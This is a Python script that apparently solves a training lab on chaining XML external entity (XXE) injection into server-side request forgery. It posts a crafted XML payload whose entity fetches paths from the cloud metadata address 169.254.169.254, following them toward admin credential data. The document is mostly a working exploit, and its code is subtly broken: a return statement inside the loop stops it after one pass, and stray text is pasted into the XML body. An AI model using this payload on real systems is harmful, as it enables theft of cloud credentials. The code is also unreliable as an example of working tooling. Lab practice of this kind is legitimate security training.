import requests
import urllib3
import re
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Exploiting XXE to perform SSRF attacks"


def run(url, payload, proxies=None):
    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Inject payload into 'productId' XML element to retrieve the path via SSRF\n2. Extract the path from the response\n3. Repeat the process with the new extracted path until you fetch the admin information\n""")

    url = url.rstrip('/')
    paths = ["/"]
    headers = { "Content-Type": "application/xml" }

    for index in range(1,7):
        if index == 6:
            print(Fore.WHITE + "Fetching admin information")
        else:
            print(Fore.WHITE + f"[{index}] Injecting payload to retrieve retrieve the path number " + Fore.BLUE + str(index) + Fore.WHITE) 
        
        path = paths[index - 1]
        payload = f"""<?xml version="1.0" encoding="UTF-8"?>
                    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254{path}">]>
                    <stockCheck>
                        <productId>
                            &xxe;
                        </productId>
                        <storeId>
                            1
                        </storeId>external entities
                        external entities
                    </stockCheck>"""

        try:
            injection = requests.post(f"{url}/product/stock", data=payload, headers=headers, verify=False, proxies=proxies)

        except Exception as e:
            print(f"[!] Error: {e}")
            return False
        
        new_path = re.findall("ID:\s*(.*)\s*", injection.text)[0]
        paths.append(f"{path}{new_path}/")
        
        if index == 6:
            print(Fore.GREEN + "OK" + Fore.WHITE)
        else:
            print(Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + paths[index])
        return True